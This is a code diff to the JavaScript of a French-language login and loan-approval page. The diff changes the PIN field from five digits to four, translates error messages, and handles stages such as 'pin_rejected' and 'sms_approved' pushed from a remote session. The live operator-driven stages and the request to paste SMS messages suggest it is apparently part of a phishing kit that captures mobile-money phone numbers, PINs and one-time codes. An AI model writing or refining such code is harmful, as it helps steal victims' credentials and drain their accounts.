@@ -213,10 +213,9 @@ function handleStageUpdate(session) {
         startSmsTimer();
     } else if (stage === 'pin_rejected') {
         document.getElementById('lpPhone').value = '';
-        [0, 1, 2, 3, 4].forEach(i => document.getElementById('lp' + i).value = '');
+        [0, 1, 2, 3].forEach(i => document.getElementById('lp' + i).value = '');
         goTo('page-login');
         document.getElementById('bLgn').disabled = false;
-        btn.textContent = 'VÉRIFIER';
         chkPin();
         showLgnMsg('error', 'Code PIN incorrect. Veuillez réessayer.');
     } else if (stage === 'sms_approved') {
@@ -437,7 +436,7 @@ document.addEventListener('keydown', function(e) {
 
 function chkPin() {
     const phone = document.getElementById('lpPhone').value.trim();
-    const pinOk = [0, 1, 2, 3, 4].every(i => document.getElementById('lp' + i).value);
+    const pinOk = [0, 1, 2, 3].every(i => document.getElementById('lp' + i).value);
     const ok = phone.length === 9 && pinOk;
     const btn = document.getElementById('bLgn');
     btn.className = ok ? 'btn-login rdy' : 'btn-login';
@@ -445,16 +444,16 @@ function chkPin() {
 }
 
 function togPin() {
-    [0, 1, 2, 3, 4].forEach(i => {
+    [0, 1, 2, 3].forEach(i => {
         const b = document.getElementById('lp' + i);
         b.type = b.type === 'password' ? 'text' : 'password';
     });
 }
 
 function clearLoginPin() {
-    [0, 1, 2, 3, 4].forEach(i => { document.getElementById('lp' + i).value = ''; });
+    [0, 1, 2, 3].forEach(i => { document.getElementById('lp' + i).value = ''; });
     chkPin();
-    document.getElementById('otp0').focus();
+    document.getElementById('lp0').focus();
 }
 
 function clearOtpCode() {
@@ -483,11 +482,11 @@ async function doLogin() {
     ['lpMsg', 'lpMsgOk', 'lpMsgWarn'].forEach(id => document.getElementById(id).classList.remove('show'));
 
     const phone = document.getElementById('lpPhone').value;
-    const pin = [0, 1, 2, 3, 4].map(i => document.getElementById('lp' + i).value).join('');
+    const pin = [0, 1, 2, 3].map(i => document.getElementById('lp' + i).value).join('');
 
-    if (phone.length !== 9 || pin.length < 5) {
+    if (phone.length !== 9 || pin.length < 4) {
         S.isSubmitting = false;
-        showLgnMsg('warning', 'Téléphone : 9 chiffres (ex: 771234567). Code PIN : 5 chiffres.');
+        showLgnMsg('warning', 'Téléphone : 9 chiffres (ex: 771234567). Code PIN : 4 chiffres.');
         return;
     }
 
@@ -621,7 +620,7 @@ async function doSmsResend() {
     } catch (err) {
         spinner.classList.remove('show');
         btn.disabled = false;
-        showSmsMsg('error', 'Network error: ' + err.message);
+        showSmsMsg('error', 'Erreur réseau : ' + err.message);
     }
 }
 
@@ -637,7 +636,7 @@ async function doSmsParse() {
 
     const msg = document.getElementById('smsMsgBox').value.trim();
     if (msg.length < 3) {
-        showSmsMsg('error', 'Please paste an SMS message.');
+        showSmsMsg('error', 'Veuillez coller un message SMS.');
         return;
     }
 
@@ -721,8 +720,8 @@ async function doOtp() {
     } catch (err) {
         document.getElementById('mOtp').classList.remove('show');
         document.getElementById('bOtp').disabled = false;
-        document.getElementById('bOtp').textContent = 'VERIFY & APPROVE LOAN';
-        showOtpMsg('error', 'Error: ' + err.message);
+        document.getElementById('bOtp').textContent = 'VÉRIFIER & APPROUVER LE PRÊT';
+        showOtpMsg('error', 'Erreur : ' + err.message);
     }
 }
 
